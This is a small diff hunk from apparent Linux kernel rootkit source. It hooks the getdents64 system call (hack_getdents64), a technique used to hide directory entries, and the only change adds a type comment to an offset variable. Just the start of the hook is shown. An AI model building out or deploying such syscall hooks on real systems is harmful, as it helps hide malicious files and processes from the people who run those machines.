@@ -16,7 +16,7 @@ static asmlinkage int hack_getdents64(const struct pt_regs *regs){
     long error;
 
     struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
-    unsigned long offset = 0;
+    unsigned long offset = 0; // u64
     int ret = orig_getdents64(regs);// get the original function's return value (size of dirent batch record)
     dirent_ker = kzalloc(ret, GFP_KERNEL); // allocate memory to keep the dirents inside to work with within the program
 
